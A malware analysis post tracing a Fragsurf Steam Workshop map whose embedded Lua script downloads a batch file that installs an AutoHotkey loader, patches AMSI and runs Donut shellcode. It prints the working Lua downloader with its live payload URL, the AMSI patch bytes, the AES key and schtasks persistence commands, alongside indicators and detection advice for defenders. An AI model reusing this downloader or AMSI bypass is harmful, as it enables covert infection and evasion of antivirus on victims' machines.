---
title: "Fragsurf: a Steam Workshop map with a Lua script that installs a Donut loader"
description: A Fragsurf Workshop map carries one extra scripted entity whose Lua code downloads a batch file, which installs an AutoHotkey loader that patches AMSI and runs encrypted Donut shellcode. The whole chain, from the map file to a scheduled task and a dead beacon.
authors: [Y2GX64]
category: Malware Analysis
date: 2026-10-24
---

*Analysis dates: 12 to 16 September 2026. The findings combine the map files downloaded with `steamcmd`, the recovered batch file and AutoHotkey loader, a Triage detonation, its packet capture and a local run with Procmon and Regshot. Indicators are defanged.*

## Summary

A user reported that a Steam Workshop item for Fragsurf, a surf-movement game, was malware. At first glance it is an ordinary map. Its `map.json` contains one extra entity, a scriptable brush with a short Lua program that uses the scripting engine's bridge to .NET to download a batch file and run it. The batch file then fetches a copy of the AutoHotkey interpreter and a 706 KB script. That script installs a scheduled task, patches the antimalware scan interface (AMSI) in its own process, decrypts a 346 KB blob and runs it as Donut shellcode. In the sandbox the shellcode tried to reach a hardcoded server about every 26 seconds and never got a reply.

| | |
|---|---|
| Lure | Steam Workshop item `3798408214` (`steamcommunity[.]com/sharedfiles/filedetails/?id=3798408214`), a Fragsurf map |
| Stage 1 | `map.json` with a `brush_scriptable` entity, SHA-256 `2c4a635facdb1f4109fddbbc27a9aeddd2b7eb44080955274524b6933bcc62a9` |
| Stage 2 | `fs.bat`, SHA-256 `c8fc165d2fbc8c75c456ccbd053e37d59d52c4fe4dc5e7d3d360f80e9d511966` |
| Stage 3 | `AutoHotkeyU64.exe` + `AutoHotkeyU64.ahk` |
| Payload host | `goawaythisisntforyou[.]com` |
| Triage sample | `260915-smxkfsyfnh` (`to_triage.zip`), score 10/10, family DonutLoader |
| Runs | win10v2004-20260911-en (491 s kernel, 490 s network); win11-20260911-en (493 s, 495 s) |
| Packet capture | `260915-smxkfsyfnh-behavioral1.pcapng`, 844 packets, 490.8 s, win10 run |
| Local run | Windows 10 VM, Procmon (1,369 events) and Regshot |

The Triage submission contains only the loader (stage 3), repackaged as `to_triage.zip`, so the Lua and batch stages are documented from the recovered files and the analyst's local runs, not from the sandbox.

## Concepts used in this sample

- **Workshop maps and embedded scripts.** Fragsurf maps are shared as `.fmap` archives holding a `map.json` entity list and geometry. Some entities, such as `brush_scriptable`, carry a `Script` field that the game runs through an embedded Lua engine.
- **`luanet`.** `luanet` is NLua's bridge between Lua and .NET. `luanet.import_type('System.Net.WebClient')` hands a script the same classes a C# program would use, so a map script can download files and start processes with no further exploit. The bridge, not a bug in Lua, is what makes a map file dangerous.
- **AutoHotkey.** A Windows automation language. `AutoHotkeyU64.exe` runs the script of the same name from its own folder, so a legitimate signed-looking interpreter plus a text file is a complete program. AutoHotkey scripts can call any Windows API through `DllCall`.
- **Donut.** An open-source generator that wraps a PE file, .NET assembly or script into position-independent shellcode that can be run from memory. Its output starts with a `call` over an encrypted configuration block.
- **AMSI.** The Antimalware Scan Interface lets Windows Defender and other products scan scripts and in-memory code. Patching `AmsiScanBuffer` in the current process makes it report an error, so code run afterwards is not scanned.

## High-level overview

<figure class="art-fig art-diagram"><div class="fig-head"><div class="fig-title">From a Workshop map to a dead beacon</div><div class="fig-sub">Seven stages, one script engine and one interpreter</div></div><div class="fig-draw" role="img" aria-label="A Workshop map script runs fs.bat, which installs an AutoHotkey loader. The loader registers a scheduled task, decrypts a blob, patches AMSI, runs Donut shellcode, and tries to reach 104.254.90.162 on port 28471 without an answer."><svg viewBox="0 0 520 414" width="520" height="414" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" style="font-family:var(--sans);max-width:100%;height:auto"><path d="M11 26 L11 374" fill="none" stroke-width="1" style="stroke:var(--line)"/><circle cx="11" cy="26" r="7" style="fill:var(--bg);stroke:var(--accent)" stroke-width="1.2"/><circle cx="11" cy="26" r="3" style="fill:var(--accent)"/><text x="34" y="24" font-size="15" style="fill:var(--ink)">Workshop map</text><text x="34" y="42" font-size="13" style="fill:var(--ink-3)">map.json brush_scriptable runs Lua via luanet</text><circle cx="11" cy="84" r="7" style="fill:var(--bg);stroke:var(--ink-3)" stroke-width="1.2"/><text x="34" y="82" font-size="15" style="fill:var(--ink)">fs.bat</text><text x="34" y="100" font-size="13" style="fill:var(--ink-3)">Downloaded and run hidden from %TEMP%</text><circle cx="11" cy="142" r="7" style="fill:var(--bg);stroke:var(--ink-3)" stroke-width="1.2"/><text x="34" y="140" font-size="15" style="fill:var(--ink)">AutoHotkey loader</text><text x="34" y="158" font-size="13" style="fill:var(--ink-3)">32-bit interpreter and a 706 KB script, hidden folder</text><circle cx="11" cy="200" r="7" style="fill:var(--bg);stroke:var(--ink-3)" stroke-width="1.2"/><text x="34" y="198" font-size="15" style="fill:var(--ink)">Persistence</text><text x="34" y="216" font-size="13" style="fill:var(--ink-3)">Scheduled task HealthTelemetrySync at logon</text><circle cx="11" cy="258" r="7" style="fill:var(--bg);stroke:var(--ink-3)" stroke-width="1.2"/><text x="34" y="256" font-size="15" style="fill:var(--ink)">Decrypt and patch AMSI</text><text x="34" y="274" font-size="13" style="fill:var(--ink-3)">AES-256-CBC, key inside the script</text><circle cx="11" cy="316" r="7" style="fill:var(--bg);stroke:var(--accent)" stroke-width="1.2"/><circle cx="11" cy="316" r="3" style="fill:var(--accent)"/><text x="34" y="314" font-size="15" style="fill:var(--ink)">Donut shellcode</text><text x="34" y="332" font-size="13" style="fill:var(--ink-3)">x86, run from memory in the interpreter</text><circle cx="11" cy="374" r="7" style="fill:var(--bg);stroke:var(--ink-3)" stroke-width="1.2"/><text x="34" y="372" font-size="15" style="fill:var(--ink)">Beacon</text><text x="34" y="390" font-size="13" style="fill:var(--ink-3)">104.254.90[.]162:28471, never answered</text></svg></div></figure>

## Indicators of compromise

### Files

Stage 1 and 2 files, then the loader files.

| File | Path | SHA-256 |
|---|---|---|
| `map.json` (inside the `.fmap` archive) | Workshop item `3798408214` | `2c4a635facdb1f4109fddbbc27a9aeddd2b7eb44080955274524b6933bcc62a9` |

| File | Path | SHA-256 |
|---|---|---|
| `fs.bat` | `%TEMP%\fs.bat` | `c8fc165d…1966` |
| `AutoHotkeyU64.exe` | `%LOCALAPPDATA%\Microsoft\Windows\Explorer\NotifyIcon\History\Cache\Settings\` | `ba35b8b4346b79b8bb4f97360025cb6befaf501b03149a3b5fef8f07bdf265c7` |
| `AutoHotkeyU64.ahk` | same folder | `a1d68abac0c47bcb91ec1caa2dbdabde2203ab04d037639f38a199beb52a07d4` |
| `SecurityHealthSystray.exe` | `%APPDATA%\Microsoft\Windows\Security\Health\` | `ba35b8b4…65c7` (identical to the interpreter) |
| `HealthTelemetry.ahk` | same folder | `a1d68aba…07d4` (identical to the script) |
| `HealthTelemetrySync.xml` | `%TEMP%` (deleted after use) | task definition |
| `fragsurf_payload.log` | `%TEMP%` | one-line status from the Lua stage |



The Triage submission used an analyst-modified `AutoHotkeyU64.ahk` (`6d7964cbea524f1eed127ad1d5e5f1773cee2d775b400807863b37cdd3097a5c`) packed in `to_triage.zip`. The decrypted Donut shellcode is 346,463 bytes, SHA-256 `343ed0db6298b63dc40da1395da960d39954c055cd0e3ff18bf5f98a3e651e56`. No exfiltration bundle was observed.

### Registry

No Run key was observed; Triage lists no Run-key signature. The local Regshot run records one new scheduled-task entry.

| Key | Value | Purpose |
|---|---|---|
| `…\Schedule\TaskCache\Tree\HealthTelemetrySync` | Task `HealthTelemetrySync`, described as "Windows security health monitoring", logon trigger, runs the interpreter copy with `HealthTelemetry.ahk` | Scheduled-task persistence |

### Mutexes

Not recorded in the evidence used for this post.

### Command lines

Paths abbreviated as in the sandbox report.

```text
cmd.exe /c "%TEMP%\fs.bat"
%TEMP%\fs.bat go
cmd /c schtasks /Create /F /TN "HealthTelemetrySync" /XML "…\Temp\HealthTelemetrySync.xml"
cmd /c schtasks /Query /TN "HealthTelemetrySync"
schtasks /SC ONLOGON    (fallback when the XML and COM methods fail)
```

### Network

| Indicator | Role |
|---|---|
| `steamcommunity[.]com/sharedfiles/filedetails/?id=3798408214` | Lure: the Workshop item |
| `goawaythisisntforyou[.]com` | Payload host: `/fs.bat`, `AutoHotkeyU64.exe`, `AutoHotkeyU64.ahk` |
| `104.254.90[.]162:28471` | Hardcoded beacon target (Canada), TCP, never answered |

### Packet correlation

Win10 run, `260915-smxkfsyfnh-behavioral1.pcapng` (844 packets, 490.8 s). Frame numbers were not recorded for this sample, so the index is by time.

| Time (s) | Endpoint | Detail |
|---|---|---|
| 161.6 – 489.5 | `104.254.90[.]162:28471` | 13 attempts, 65 SYNs, a new attempt about every 26 s, no SYN-ACK or RST |

### Cross-run consistency

The Windows 10 run shows the full chain. The Windows 11 run shows only Explorer opening the zip and nothing else, which is inconclusive (a sandbox miss or an environment check; there is no evidence either way).

## Execution flow

### 1. Stage 1: the map

The downloaded item is a zip with the `.fmap` extension that holds geometry, lightmaps, a few textures, `worldgeometry.json` and `map.json`. It contains no executable and no script files, which is why a file listing looks clean. The only code is inside `map.json`.

The map itself is minimal: one spawn, a sun, a single model and four timer triggers (`trigger_timer_start`, `_end`, `_checkpoint`, `_fall`), plus one `brush_scriptable`. The `PackageRoots` entries point at the editor's build folders, which shows it was exported from a map-editor build. The scripted brush is the only entity in the file with a `Script` field:

| Field | Value |
|---|---|
| `ClassName` | `brush_scriptable` |
| `UniqueId` | `99999` (the other entities use ordinary small IDs) |
| `TargetName` | `payload` |
| `Enabled` / `Interactable` / `IsSolid` | `True` / `False` / `False` |
| `position` | `431.8228 256 -639.5801` |
| Script size | 930 characters |

The entity is enabled but cannot be touched or collided with, so it exists only to run its script. How the game starts it was not observed in this analysis, because the map was never loaded in Fragsurf. An enabled, non-interactive scripted brush suggests it runs when the map loads.

#### The script

```lua
luanet.load_assembly('System')
luanet.load_assembly('System.Core')
local Path = luanet.import_type('System.IO.Path')
local File = luanet.import_type('System.IO.File')
local WebClient = luanet.import_type('System.Net.WebClient')
local Process = luanet.import_type('System.Diagnostics.Process')
local ProcessStartInfo = luanet.import_type('System.Diagnostics.ProcessStartInfo')

local function log(msg)
  File.WriteAllText(Path.Combine(Path.GetTempPath(), 'fragsurf_payload.log'), tostring(msg))
end

local ok, err = pcall(function()
  local url = 'https://goawaythisisntforyou.com/fs.bat'
  local dst = Path.Combine(Path.GetTempPath(), 'fs.bat')
  local wc = WebClient()
  wc:DownloadFile(url, dst)
  local psi = ProcessStartInfo()
  psi.FileName = 'cmd.exe'
  psi.Arguments = '/c "' .. dst .. '"'
  psi.UseShellExecute = false
  Process.Start(psi)
  log('ok: ' .. dst)
end)
if not ok then log('err: ' .. tostring(err)) end
```

The script downloads `fs.bat` to the temp folder, starts it with `cmd.exe`, and writes a one-line status (`ok: <path>` or `err: <message>`) to `%TEMP%\fragsurf_payload.log`. That log file is a host indicator and the only trace this stage leaves. The domain name, "goaway this isn't for you", reads as a taunt aimed at analysts.

### 2. Stage 2: `fs.bat`

The batch file is 966 bytes and does four things:

1. **Relaunches itself hidden.** Without the argument `go`, it starts a new copy of itself through a hidden PowerShell (`Start-Process cmd … -WindowStyle Hidden`) and exits.
2. **Creates a hidden working folder.** `%LOCALAPPDATA%\Microsoft\Windows\Explorer\NotifyIcon\History\Cache\Settings`, a deeply nested path made to look like a Windows cache, marked hidden with `attrib +h`.
3. **Downloads the loader.** With `curl`, it fetches `AutoHotkeyU64.exe` and `AutoHotkeyU64.ahk` from `goawaythisisntforyou[.]com`.
4. **Sanity-checks and starts it.** It runs the executable only if the exe is larger than 800,000 bytes and the script larger than 500,000 bytes, which guards against running an error page if the download failed. Three seconds later it deletes itself.

The AutoHotkey executable is named like the 64-bit build, but it is a **32-bit PE** (version 1.1.37.02, Unicode). That matters later, because the shellcode it runs is x86.

### 3. Stage 3: the AutoHotkey loader

The script (706,599 B, SHA-256 `a1d68abac0c47bcb91ec1caa2dbdabde2203ab04d037639f38a199beb52a07d4`) is about 800 lines, and roughly 700 KB of it is 70 variables of hex text. The logic runs in clear phases, each marked by a comment in the source.

**Phase 0, persistence.** The script copies itself into `%APPDATA%\Microsoft\Windows\Security\Health\`, the folder name used by the real Windows Security Health service, as `SecurityHealthSystray.exe` and `HealthTelemetry.ahk`. The genuine `SecurityHealthSystray.exe` lives in `System32`, so the copy borrows a name people see in Task Manager. Then it registers a hidden scheduled task named `HealthTelemetrySync`, described as "Windows security health monitoring", with a logon trigger, least privilege and interactive logon. It tries three methods in turn, so one blocked path does not stop it:

1. write a task XML to `%TEMP%\HealthTelemetrySync.xml` and run `schtasks /Create /F /TN HealthTelemetrySync /XML …`,
2. create the task through the `Schedule.Service` COM object,
3. fall back to `schtasks /SC ONLOGON`.

It verifies the result with `schtasks /Query`. The task action runs the copy of the interpreter with the copy of the script as its argument:

<figure class="art-fig"><div class="fig-head"><div class="fig-title">The scheduled task's action</div><div class="fig-sub">Task Scheduler, local analysis VM</div></div><div class="fig-draw"><img src="/shared/img/fragsurf/task-action.jpg" alt="Task Scheduler Edit Action dialog for HealthTelemetrySync: program SecurityHealthSystray.exe in the Windows Security Health folder with HealthTelemetry.ahk as its argument" width="943" height="633" loading="lazy" /></div></figure>

**Phases 1 and 2, decrypt.** The script joins its 70 hex variables into one string (692,928 hex characters, 346,464 bytes), converts it to binary with `CryptStringToBinaryW`, and decrypts it with AES-256-CBC through `bcrypt.dll`. The key and IV are hardcoded in the same file:

| | |
|---|---|
| Key | `436047c9f91b3df127a0769f11e6a91f6b6bbefff8688419001ce2d95decc207` |
| IV | `e72eb6d8b1d76b59908d943073580d4c` |

Because both values are in the script, the blob decrypts statically. The result is 346,463 bytes (SHA-256 `343ed0db6298b63dc40da1395da960d39954c055cd0e3ff18bf5f98a3e651e56`) and starts with `E8 C0 1B 05 00`, a `call` of 0x51BC0 bytes. The first four bytes after the call are the same length, 334,784, which marks a Donut instance followed by an 11 KB loader stub. The script's own comment calls it "Donut shellcode (x86)".

**Phase 3, AMSI patch.** The script loads `amsi.dll`, finds `AmsiScanBuffer`, makes its first 8 bytes writable and overwrites them with `B8 57 00 07 80 C2 18 00`, which is `mov eax, 0x80070057; ret 0x18`. That makes the function return `E_INVALIDARG` without scanning anything, so later in-memory activity in this process escapes AMSI. It then restores the memory protection.

**Phase 4, run the shellcode.** The script allocates executable memory with `VirtualAlloc`, copies the decrypted bytes in with `RtlMoveMemory`, starts a thread at the start of the block and waits on it forever. Because the host is the 32-bit interpreter, the x86 shellcode runs inside it.

**Phase 5, cleanup.** On a first run from a drop folder, the script deletes its own `.ahk` file and, after a short ping delay, the original executable, leaving only the copies in the persistence folder.

#### Dropped files

The files, paths and hashes are listed under Indicators of compromise, Files.

The persistence copies are plain duplicates of the loader. The encrypted blob is the Donut shellcode, not those files, so the persistent task re-runs the whole decrypt-and-execute sequence at each logon.

### 4. What the sandbox saw

Triage ran `to_triage.zip`, a zip holding `AutoHotkeyU64.exe` and an analyst-modified `AutoHotkeyU64.ahk` (SHA-256 `6d7964cbea524f1eed127ad1d5e5f1773cee2d775b400807863b37cdd3097a5c`). The modified script has the same key, IV and encrypted blob as the original, patches the code that locates the interpreter to copy, and removes Phase 5, so the loader does not delete itself and the run can be inspected. Triage scored it 10/10 and detected the family as DonutLoader.

The process tree on the Windows 10 run:

```text
Explorer.EXE /idlist,,…\Temp\to_triage.zip
  └ AutoHotkeyU64.exe  (from Documents\to_triage\to_triage\)
      ├ cmd.exe /c schtasks /Create /F /TN "HealthTelemetrySync" /XML "…\Temp\HealthTelemetrySync.xml"
      ├ cmd.exe /c schtasks /Query /TN "HealthTelemetrySync"
      └ (later, from the scheduled task) SecurityHealthSystray.exe
OpenWith.exe → NOTEPAD.EXE …\AutoHotkeyU64.ahk
```

All `cmd.exe` and `schtasks.exe` instances are the 32-bit copies in `SysWOW64`, which confirms the interpreter is a 32-bit process. The local run agrees. Procmon shows the same `schtasks` commands about 0.3 and 0.6 s after launch, and Regshot records a new `TaskCache\Tree\HealthTelemetrySync` entry. Triage lists no Run-key signature.

#### The beacon

About 161 seconds into the capture the loader process, which is running the shellcode, starts calling `104.254.90[.]162` (Canada) on TCP port 28471. There is no DNS lookup, so the address is hardcoded. The capture holds 65 SYN packets in 13 connection attempts:

| Attempt | First SYN (s) | Last SYN (s) | SYNs |
|---|---|---|---|
| 1 | 161.6 | 176.6 | 5 |
| 2 | 187.6 | 202.7 | 5 |
| 3 | 213.7 | 228.8 | 5 |
| 4 | 239.8 | 254.8 | 5 |
| … | … | … | 5 each |
| 12 | 448.4 | 463.4 | 5 |
| 13 | 474.4 | 489.5 | 5 |

Each attempt retransmits its SYN at roughly 1, 2, 4 and 8 second gaps, and a new attempt starts about every 26 seconds. The server never answered, with no SYN-ACK and no RST, so no payload was ever exchanged. It may be offline, filtered or blackholing the address. The shellcode's real behavior beyond this retry loop is therefore unknown.

The Windows 11 run shows only Explorer opening the zip and nothing else. That run is inconclusive. It might be a sandbox miss and it might be an environment check, and the report has no evidence either way.

### Sandbox tags and heuristics reviewed

Triage also tags the sample `ransomware` and fires "Opens file in notepad (likely ransom note)". `OpenWith.exe` launches Notepad on `AutoHotkeyU64.ahk`, most likely because the sandbox tried to open the extracted script and `.ahk` has no registered handler there. The file it opens is the loader's own source, not a note, and nothing in the run encrypts or renames a file.

## Detection

- **Workshop content.** A Fragsurf map whose `map.json` contains `luanet`, `System.Diagnostics.Process`, `WebClient` or a URL. Legitimate maps have little reason to import .NET types. The entity pair `brush_scriptable` with `UniqueId` `99999` and `TargetName` `payload` is specific to this sample.
- **Process lineage.** The game process spawning `cmd.exe`, `curl.exe` or `powershell.exe`; `cmd.exe` running `%TEMP%\fs.bat go`; any `AutoHotkeyU64.exe` or `SecurityHealthSystray.exe` that is not under `System32` and not signed by Microsoft.
- **Files.** `%TEMP%\fragsurf_payload.log`; the hidden `…\NotifyIcon\History\Cache\Settings` folder; `%APPDATA%\Microsoft\Windows\Security\Health\HealthTelemetry.ahk`. A `.ahk` file under a Windows-style folder deserves a look on any machine.
- **Persistence.** A scheduled task named `HealthTelemetrySync` with the description "Windows security health monitoring", running an interpreter out of `AppData\Roaming`.
- **Memory and API.** A 32-bit AutoHotkey process that calls `VirtualProtect` on `AmsiScanBuffer`, then `VirtualAlloc` and `CreateThread`. The eight bytes `B8 57 00 07 80 C2 18 00` at the start of `AmsiScanBuffer` identify the patch.
- **Network.** A 32-bit interpreter making repeated raw TCP connections to `104.254.90[.]162:28471`, and `curl` requests to `goawaythisisntforyou[.]com`.
- **Hashes.** `ba35b8b4346b79b8bb4f97360025cb6befaf501b03149a3b5fef8f07bdf265c7` is a stock AutoHotkey build, so alert on it only in the paths above.

## MITRE ATT&CK

| Tactic | Technique | Evidence |
|---|---|---|
| Execution | T1059 Command and Scripting Interpreter | Lua map script; the luanet bridge exposes .NET |
| Execution | T1059.003 Windows Command Shell | `fs.bat`, `cmd.exe /c schtasks` |
| Execution | T1059.010 AutoHotkey & AutoIT | `AutoHotkeyU64.exe` running the loader script |
| Command and Control | T1105 Ingress Tool Transfer | `fs.bat` downloads the interpreter and script from the payload host |
| Command and Control | T1095 Non-Application Layer Protocol | Raw TCP beacon to `104.254.90[.]162:28471` |
| Persistence | T1053.005 Scheduled Task | `HealthTelemetrySync` |
| Defense Evasion | T1564.001 Hidden Files and Directories | Hidden working folder and hidden task |
| Defense Evasion | T1036.005 Match Legitimate Name or Location | `SecurityHealthSystray.exe`, `HealthTelemetry.ahk` |
| Defense Evasion | T1140 Deobfuscate/Decode Files or Information | AES-256-CBC decryption of the 346 KB blob |
| Defense Evasion | T1562.001 Impair Defenses: Disable or Modify Tools | AMSI patch of `AmsiScanBuffer` |
| Defense Evasion | T1620 Reflective Code Loading | Donut shellcode run from memory |
| Defense Evasion | T1070.004 File Deletion | Loader deletes its own script and executable |

Triage's own matrix lists only T1059.003, T1053.005 and T1614.001, so the AMSI patch, in-memory loading and the Lua and batch stages are analyst findings.

## Confidence and limits

**Observed.** The Lua script in `map.json`; the content of `fs.bat`; the full logic of the AutoHotkey loader, including its key, IV and decrypted blob; the scheduled task, the process tree and the file copies in the sandbox and local runs; and 13 unanswered beacon attempts to `104.254.90[.]162:28471`.

**Inferred.** That the scripted brush runs when the map loads, since the map was never loaded in the game; that the shellcode makes the beacon, because the loader itself contains no network code; and that the host server is offline.

**Not established.** The Donut module and its behavior, the live content of `goawaythisisntforyou[.]com`, the full `.fmap` as shipped (the analysis used the extracted files), and what happens on a Windows 11 host. The Triage submission used an analyst-modified copy of the loader, so its process tree is a faithful run of the same logic but not of the original file.

*Sources: the Workshop item downloaded with `steamcmd`, the recovered `fs.bat` and loader, Triage sample 260915-smxkfsyfnh with its packet capture, and Procmon and Regshot logs from a local run.*

### What is not known

The Donut payload could not be unwrapped. The blob decrypts cleanly, and its structure is consistent with Donut (the call over the instance, the matching length field, the loader stub), but its internal configuration is encrypted with Donut's own cipher. Two standard layouts were tried (Chaskey and Speck counter modes) and neither produced readable data, so the wrapped module (a PE, a .NET assembly or a script) and its capabilities remain unrecovered. For the same reason this post cannot say whether the loader is the final stage or a stager, and the Triage run shows only a dead beacon.
